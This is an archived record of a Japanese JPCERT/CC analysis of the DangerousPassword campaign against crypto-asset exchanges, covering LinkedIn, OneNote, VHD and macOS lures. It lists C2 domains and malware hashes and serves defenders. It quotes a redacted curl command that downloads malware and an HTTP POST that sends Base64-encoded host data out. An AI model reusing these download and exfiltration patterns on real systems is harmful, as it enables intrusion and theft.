{
    "id": "3e5270fd-a4d5-4125-b90e-c29d12b3e7ea",
    "created_at": "2023-06-05T02:06:56.409232Z",
    "updated_at": "2025-03-27T02:14:56.650862Z",
    "deleted_at": null,
    "sha1_hash": "b24b9d022eba55460b2c5097de58aa7f75f67346",
    "title": "2023-05-01 - Attack trends related to the attack campaign DangerousPassword",
    "authors": "",
    "file_creation_date": "2023-06-04T12:24:47Z",
    "file_modification_date": "2023-06-04T12:24:47Z",
    "file_size": 1515200,
    "plain_text": "# 攻撃キャンペーンDangerousPasswordに関連する攻撃動向\n\n**blogs.jpcert.or.jp/ja/2023/05/dangerouspassword.html**\n\n朝長 [秀誠 (Shusei Tomonaga)](https://blogs.jpcert.or.jp/ja/shu_tom/)\n\n2023/05/01\n\n[メール](mailto:?subject=%E6%94%BB%E6%92%83%E3%82%AD%E3%83%A3%E3%83%B3%E3%83%9A%E3%83%BC%E3%83%B3DangerousPassword%E3%81%AB%E9%96%A2%E9%80%A3%E3%81%99%E3%82%8B%E6%94%BB%E6%92%83%E5%8B%95%E5%90%91&body=https%3A%2F%2Fblogs.jpcert.or.jp%2Fja%2F2023%2F05%2Fdangerouspassword.html)\n\n[JPCERT/CCは、2019年6月から継続して攻撃キャンペーンDangerousPassword](https://blogs.jpcert.or.jp/ja/2019/07/shorten_url_lnk.html)\n（CryptoMimicまたは、SnatchCryptoとも呼ばれる）に関連すると考えられる暗号資産交換\n事業者への攻撃を確認しています。攻撃者は、ショートカットファイルをメールでターゲッ\nトに送信して、マルウェアに感染させようとする攻撃手法を長年続けているのですが、その\n他にもいろんなパターンの攻撃を行いながらマルウェア感染を狙っていることがわかってい\nます。今回は、最近確認されたDangerousPasswordの攻撃手法について紹介します。\n\n今回、紹介する攻撃パターンは以下の4つです。\n\nLinkedinから不正なCHMファイルを送りつけてくる攻撃\nOneNoteファイルを利用した攻撃\n仮想ハードディスク（Virtual Hard Disk）ファイルを利用した攻撃\nmacOSを狙った攻撃\n\n### LinkedInから不正なCHMファイルを送りつけてくる攻撃\n\n攻撃者は、メールの添付ファイルでマルウェアを送信してくる以外にも、LinkedInでターゲ\nットにコンタクトしてきて、マルウェアを送りつけてくる場合もあります。図1は、\nLinkedIn経由で送られてきたマルウェアがホスト上に感染するまでの流れです。\n\n\n-----\n\n図\n\n1：マルウェア感染の流れ\nLinkedIn経由で送られてきたファイルはRAR形式で圧縮されており、展開するとWindowsヘ\nルプファイル（CHMファイル）が含まれています。このファイルを実行すると、外部から\nWindows インストーラー ファイル（MSIファイル）をダウンロードして実行します。実行\nされたMSIファイルは、PowerShellスクリプトを使用して外部から追加のMSIファイルをダ\nウンロードして実行します（図1のAdministrator-a214051.msi、なおファイル名は[実行した\n\nユーザー名]-a[ランダムな数字5桁]1.msiとなる）。このMSIファイルは、感染ホストの情報を\n送信する機能を持っており、以下のようにHTTP POSTリクエストで情報を送信します。送\n信する感染ホストの情報は、Base64エンコードされています。\n```\nPOST /test.msi HTTP/1.1\n\nConnection: Keep-Alive\n\nContent-Type: application/x-www-form-urlencoded\n\nAccept: */*\n\nAccept-Language: ja-JP\n\nUser-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)\n\nContent-Length: 8708\n\nHost: [サーバー名]\n\nVGltZToJV2VkIERl(...)\n\n\n```\n図2は、マルウェアが感染ホストの情報を収集するコードの一部です。JScriptで作成されて\nいることがわかります。\n\n\n-----\n\n図\n\n2：マルウェアのコードの一部\nなお、ターゲットに対してコンタクトしてくるLinkedInアカウントは、求人情報を連絡する\nように装って、ターゲットに対してマルウェアを送りつけてくることを確認しています。図\n3はターゲットに対してコンタクトしてきたLinkedInアカウントですが、これらのアカウン\nトも攻撃者によって乗っ取られていると考えられます。現在のところ、攻撃者がSNSアカウ\nントを乗っ取る方法については不明です。\n\n\n-----\n\n図\n\n3：攻撃者に悪用されたLinkedInアカウント例\n\n### OneNoteファイルを利用した攻撃\n\nOneNoteファイルを悪用してマルウェアに感染させようとする手法は、Emotetなどでも確\n認されており、メールの添付ファイルから感染を広げるタイプの攻撃では定番になりつつあ\nります。DangerousPasswordも、同様の攻撃手法を利用しており、図4のようなマルウェア\nの埋め込まれたOneNoteファイルを送付し、OneNoteファイルを表示した際に表示されるア\nイコン（図4のPDFファイルに見せかけたアイコン）をクリックさせることで、マルウェア\n感染させようとします。\n\n\n-----\n\n図\n\n4：OneNoteファイルの例\nOneNoteファイルに埋め込まれたマルウェアはMSIファイルで、DLLファイルをホスト上に\n保存して、実行します。DLLファイルは、以下のcurlコマンドを使用してマルウェアをダウ\nンロードします。\n```\ncurl -A cur1-agent -L [URL] -x [Proxy] -s -d dl\n\n\n```\nまた、このマルウェアは図5のようにウイルス対策ソフトを検知する機能を持っています。\n\n\n-----\n\n図\n\n5：ウイルス対策ソフトを検知するコードの一部\n以下のウイルス対策ソフトを検知した場合、NTDLLへのフック処理を解除して、ウイルス対\n策ソフトの監視を逃れようとしたり[1]、curlコマンド実行時に送信するデータ（dlまたは\n```\nda）が変更されたり、ダウンロードしたマルウェアを実行する方法を変更（Explorerへのイ\n\n```\nンジェクションまたは、Rundll32を使って起動）したり、ホスト上での挙動を変更します。\n\nAvast\nAvira\nBitdefender\nKaspersky\nSophos\nTrend Micro\n\n\n-----\n\nWindows Defender\n\n### 仮想ハードディスク（Virtual Hard Disk）ファイルを利用した攻撃\n\n攻撃者は、マルウェアをZIPやRAR形式で圧縮したり、ISOファイルに含める以外にも、仮\n想ハードディスクファイル（VHDファイル）に含めている場合もあります。VHDファイル\nは、仮想化技術であるHyper-Vにてハードディスクを使用するためにファイルとして保存す\nる形式であり、Windows OS上ではダブルクリックでマウントすることが可能です。図6\nは、マルウェアが含まれたVHDファイルをマウントした様子です。中には、デコイのPDFフ\nァイルとメインのマルウェア（DLLファイル）およびDLLファイルを起動するための実行フ\nァイル（EXEファイル）が含まれています。\n\n図\n\n6：VHDファイルをマウントした例\nDLLファイルは、前節で説明したOneNoteファイルに含まれていたマルウェアと同様の機能\nを持ったマルウェアです。\n\n### macOSを狙った攻撃\n\n攻撃者は、Windows OSだけではなくmacOSもターゲットにしていることを確認していま\nす。図7は、macOSをターゲットにしたマルウェアのファイル構成です。\n\n\n-----\n\n図\n\n7：マルウェアのファイル構成\n図8のように、main.scpt内に不正なアプリケーションをcurlコマンドを使ってダウンロード\nし、実行するAppleScriptが含まれています。\n\n図8: 不正なAppleScriptの内容\nダウンロードされるアプリケーションを実行すると、図9のような画面が起動します。読み\n込ませるファイルの内容をXORデコードして、デコードされた通信先からファイルをダウン\nロードして、実行する機能（図10）を持っています。\n\n\n-----\n\n9：ダウンロードされたマルウェア実行時に表示される画面\n\n\n図\n\n図\n\n\n10：ファイルをダウンロードするコードの一部\nなお、本マルウェアの詳細についてはjamfのブログ[2]でも公開されているため、そちらもご\n参照ください。\n\n### おわりに\n\n\n-----\n\n標的型攻撃グループDangerousPasswordは、国内の暗号資産交換事業者に対して、引き続\nき攻撃を行っています。この攻撃グループは、LinkedInからターゲットに対してコンタクト\nしてくることもあるので、SNSの使用時には注意が必要です。また、macOSもターゲット\nになる可能性もあるため、macOSを使用している場合も警戒しておくことが重要です。今\n回紹介したマルウェアの通信先などについては、Appendixに記載していますのでご確認く\nださい。\n\nインシデントレスポンスグループ 朝長 秀誠\n\n参考情報\n\n[1] Red Team Notes: Full DLL Unhooking with C++\n\n[https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++](https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++)\n\n[2] jamf: BlueNoroff APT group targets macOS with ‘RustBucket’ Malware\n[https://www.jamf.com/blog/bluenoroff-apt-targets-macos-rustbucket-malware/](https://www.jamf.com/blog/bluenoroff-apt-targets-macos-rustbucket-malware/)\n\n**Appendix A: 通信先**\n\nwww.thecloudnet.org\nazure.protection-service.cloud\nverify.azure-protect.online\ndocs.azure-protection.cloud\nsecure.azure-protection.cloud\nweb.j-ic.co\ncloud.dnx.capital\n104.200.137.32\none.microshare.cloud\nwww.capmarketreport.com\nsafe.doc-share.cloud\nopenaibt.com\ncloud.espcapital.pro\nautoprotect.com.de\n\n**Appendix B: マルウェアのハッシュ値**\n\nbdd109cba8346548dd6fe5110180aa23eb9f5805c90733025344a5881c15c985\n4867215129fead94a52e4b62ef6851b3170a0a8b66a87eadfc919f84257d25b8\nf0b6d6981e06c7be2e45650e5f6d39570c1ee640ccb157ddfe42ee23ad4d1cdb\n31908e42d8cb30f5bda71516de7c5c6a329c7dddcae77e19f64379d351177b90\n782f24a4b8fa692489ddfdac5eb989f5852bbe0da05c2e27190047f77282b936\nfc07a2468fafc762e106dd33fd0734a05118eb96d66fcc7ed358669e888d53ca\n248867e775fda3c6c03c1daeb0e10d2ce5956cb1c164bbd980ff98fe2f97e38c\n5816eb32cbaadfc3477c823293a8c49cdf690b443c8fa3c19f98399c143df2b3\n\n\n-----\n\n5f4f006bfb9136c304e0aabf75575360120d022567180ce6b9c1835e209c541e\n4fb31b9f5432fd09f1fa51a35e8de98fca6081d542827b855db4563be2e50e58\nf14c5bad5219b1ed5166eb02f5ff08a890a181cef2af565f3fe7bcea9c870e22\n826f2a2a25f7b7d42f54d18a99f6721f855ba903db7b125d7dea63d0e4e6df64\nd6c3d0d2dedfa37cd1bebded60f303b21da860dcac49cfaa06e3172f0b1138ce\nf14c5bad5219b1ed5166eb02f5ff08a890a181cef2af565f3fe7bcea9c870e22\n48bd1c5cf9ccc3d454ab80d7284abaf39028a228607d132bfa92ab2ceca47ca2\nf0cf1829a93751d2f7e812545af079a4efebd755f1ee50a8d4537770f692eaaf\n9472f5ecac1672186bc1275cc70f024c734d0e6926917ce22b2cb6b1765ce83e\nab31b0cb796b3ae001fb4d12d9cac8c98911e11322cb974bf8d2be9303259a5e\nf14c5bad5219b1ed5166eb02f5ff08a890a181cef2af565f3fe7bcea9c870e22\n5ad84c75b4a8825a4ee49fcb2ab895f0a51c9877fc4e50595fa1917ae1daa748\n8a7ba38d597e8230609df4153039d1bb898479d486e653a6d92d206dd4848c80\nba186a1a97d4f647dad39cb3ccae5466bb8d5463ceedf470428484416265ef5f\n7e2b38decf1f826fbb792d762d9e6a29147e9ecb44eb2ad2c4dc08e7ee01a140\nc56a97efd6d3470e14193ac9e194fa46d495e3dddc918219cca530b90f01d11e\n9525f5081a5a7ab7d35cf2fb2d7524e0777e37fe3df62730e1e7de50506850f7\n7981ebf35b5eff8be2f3849c8f3085b9cec10d9759ff4d3afd46990520de0407\n38106b043ede31a66596299f17254d3f23cbe1f983674bf9ead5006e0f0bf880\n741be5e53a5dc7cebaa63d6ff624c5eff1a0e1817ede1e7fc0473a28b1ed7a33\na131edf272f1df1c841a9c457a50011325b1e22e950d62c5e78d3060450e6b93\nb63bca8d35653ce17b99b89f00fbee9b5cb6a70420b7dd0c3194038b9031e3e2\n9f7a7717884519763f043c39c1cb2a9605da123c18b72e5bedcd5d587a54a0e8\na3f087c83453cde2bc845122c05ebeb60e8891e395b45823c192869ec1b72ea6\n3a4aed5b9ad0827696a1bb5f3497a6a2aa26b453d27bfacbe3c8c47673aac98d\n02acbedc105104541e67eec1ef845c7d68d624faa56e81713e3216ca66a7f3c7\n1bc742f1aebbc12220cd6bf761509fd3a7aae2d5de88dce8d45fb5cf79ad8ccb\na2fd03354c2ec433d2eedc28e85c0fe5841b848d5fff1e6583e2d9e1a81b6ca3\n049bfff97fbb2c5e53eeed6df36d2c93c7cca199d42c0247c784b39db90f173b\n26e376fc80b090b2ee04e7d3104d308a150e58538580109a74f4ac49bf362423\n60701bdae4b33de7c53e4a0708b7187f313730bd09c4c553847134f268160a73\na064e62cb168affa9dac8a4374b582bfa289e182f8a5e0b731c4ea9408d99ae3\na1a30091cf25740468cd1894d39fce07039f89f05eee90cf72aa085698eeeff6\nd18cda8fc17f0c412b209dda24784cbe666fe79a708c9965cd18eef85439adb2\n7935839ab987a47b9bacc2daf12e7af590259abcfdd473c81a7e540e58ed5760\neee5ee98f57ab2b30a3bf04b8fa9d7b90455ddf2d39c8c4e04958b77d9170411\nd0072130eb4ee81ffba5b703a16c276b0c59b408cb8aa3915980f0f098f04984\n\n[メール](mailto:?subject=%E6%94%BB%E6%92%83%E3%82%AD%E3%83%A3%E3%83%B3%E3%83%9A%E3%83%BC%E3%83%B3DangerousPassword%E3%81%AB%E9%96%A2%E9%80%A3%E3%81%99%E3%82%8B%E6%94%BB%E6%92%83%E5%8B%95%E5%90%91&body=https%3A%2F%2Fblogs.jpcert.or.jp%2Fja%2F2023%2F05%2Fdangerouspassword.html)\n\nこの記事の筆者\n\n\n-----\n\n朝長 [秀誠 (Shusei Tomonaga)](https://blogs.jpcert.or.jp/ja/shu_tom/)\n\n外資系ITベンダーでのセキュリティ監視・分析業務を経て、2012年12月から現職。現在\nは、マルウェア分析・フォレンジック調査に従事。主に、標的型攻撃に関するインシデント\n分析を行っている。CODE BLUE、BsidesLV、BlackHat USA Arsenal、Botconf、PacSec、\nFIRSTなどで講演。JSACオーガナイザー。\n\nこのページは役に立ちましたか？\n\n0人が「このページが役に立った」と言っています。\n\nその他、ご意見・ご感想などございましたら、ご記入ください。\n\nこちらはご意見・ご感想用のフォームです。各社製品については、各社へお問い合わせくだ\nさい。\n\njavascriptを有効にすると、ご回答いただけます。 ありがとうございました。\n\n## 関連記事\n\nLinuxルーターを狙ったGo言語で書かれたマルウェアGobRAT\n\n\n-----\n\n暗号資産交換業者を標的とするParallax RAT感染を狙った活動\n\nMalware Analysis Operations（MAOps）の自動化\n\nGitHubからC2サーバーの情報を取得するマルウェアVSingle\n\n攻撃グループLazarusが使用するマルウェアYamaBot\n\n≪ [前へ](https://blogs.jpcert.or.jp/ja/2023/04/parallax-rat.html)\n[トップに戻る](https://blogs.jpcert.or.jp/ja/)\n[次へ](https://blogs.jpcert.or.jp/ja/2023/05/cost-and-effectiveness-of-alerts.html) ≫\n\n\n-----",
    "language": "JA",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-05-01 - Attack trends related to the attack campaign DangerousPassword.pdf"
    ],
    "report_names": [
        "2023-05-01 - Attack trends related to the attack campaign DangerousPassword.pdf"
    ],
    "threat_actors": [
        {
            "id": "1bdb91cf-f1a6-4bed-8cfa-c7ea1b635ebd",
            "created_at": "2022-10-25T16:07:23.766784Z",
            "updated_at": "2025-03-27T02:02:09.971636Z",
            "deleted_at": null,
            "main_name": "Bluenoroff",
            "aliases": [
                "APT 38",
                "ATK 117",
                "Alluring Pisces",
                "Black Alicanto",
                "Bluenoroff",
                "CTG-6459",
                "Copernicium",
                "Nickel Gladstone",
                "Sapphire Sleet",
                "Selective Pisces",
                "Stardust Chollima",
                "T-APT-15",
                "TA444",
                "TAG-71",
                "TEMP.Hermit"
            ],
            "source_name": "ETDA:Bluenoroff",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f426f0a0-faef-4c0e-bcf8-88974116c9d0",
            "created_at": "2022-10-25T15:50:23.240383Z",
            "updated_at": "2025-03-27T02:00:55.404232Z",
            "deleted_at": null,
            "main_name": "APT38",
            "aliases": [
                "APT38",
                "NICKEL GLADSTONE",
                "BeagleBoyz",
                "Bluenoroff",
                "Stardust Chollima",
                "Sapphire Sleet",
                "COPERNICIUM"
            ],
            "source_name": "MITRE:APT38",
            "tools": [
                "ECCENTRICBANDWAGON",
                "HOPLIGHT",
                "Mimikatz",
                "KillDisk",
                "DarkComet"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "8bc1a044-a23b-4904-903c-13f463605cb3",
            "created_at": "2024-05-01T02:03:08.136237Z",
            "updated_at": "2025-03-27T02:05:17.415795Z",
            "deleted_at": null,
            "main_name": "NICKEL GLADSTONE",
            "aliases": [
                "Bluenoroff ",
                "CTG-6459 ",
                "Citrine Sleet ",
                "HIDDEN COBRA ",
                "Lazarus Group",
                "Sapphire Sleet ",
                "Stardust Chollima ",
                "APT38 "
            ],
            "source_name": "Secureworks:NICKEL GLADSTONE",
            "tools": [
                " Bankshot",
                " CATCH22",
                " CCGC_Proxy",
                " Cur1Agent",
                " Ratankba",
                " Server_TrafficForwarder",
                " Wcry",
                "AlphaNC"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a2b92056-9378-4749-926b-7e10c4500dac",
            "created_at": "2023-01-06T13:46:38.430595Z",
            "updated_at": "2025-03-27T02:00:02.831633Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Operation DarkSeoul",
                "APT38",
                "ATK117",
                "DEV-1222",
                "G0032",
                "APT 38",
                "Stardust Chollima",
                "APT-C-26",
                "ATK3",
                "Diamond Sleet",
                "Hidden Cobra",
                "Unit 121",
                "Subgroup: Bluenoroff",
                "NICKEL GLADSTONE",
                "DEV-0139",
                "Andariel",
                "Operation Troy",
                "COVELLITE",
                "TA404",
                "Lazarus group",
                "Dark Seoul",
                "G0082",
                "NewRomanic Cyber Army Team",
                "Bluenoroff",
                "Appleworm",
                "Nickel Academy",
                "COPERNICIUM",
                "Hastati Group",
                "Bureau 121",
                "Operation AppleJeus",
                "Whois Hacking Team",
                "Citrine Sleet",
                "Sapphire Sleet",
                "Group 77",
                "Labyrinth Chollima",
                "Operation GhostSecret",
                "BeagleBoyz"
            ],
            "source_name": "MISPGALAXY:Lazarus Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1685930816,
    "ts_updated_at": 1743041696,
    "ts_creation_date": 1685881487,
    "ts_modification_date": 1685881487,
    "files": {
        "pdf": "https://archive.orkl.eu/b24b9d022eba55460b2c5097de58aa7f75f67346.pdf",
        "text": "https://archive.orkl.eu/b24b9d022eba55460b2c5097de58aa7f75f67346.txt",
        "img": "https://archive.orkl.eu/b24b9d022eba55460b2c5097de58aa7f75f67346.jpg"
    }
}